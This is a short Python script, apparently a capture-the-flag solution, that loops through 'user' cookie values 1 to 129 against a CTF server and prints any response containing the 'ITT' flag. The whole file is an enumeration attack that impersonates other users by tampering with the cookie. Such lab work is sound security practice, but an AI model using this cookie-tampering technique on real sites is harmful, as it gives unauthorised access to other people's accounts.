import requests

url = "http://ctf.hackusati.tech:7010"

for i in range(1, 130):
    print("POST request #" + str(i))
    r = requests.post(url, cookies={"user": "{}".format(i)})
    print(r.text)
    if "ITT" in r.text:
        # search for ITT
        flag = r.text.split("ITT")[1]
        print("FLAG: ITT" + flag)
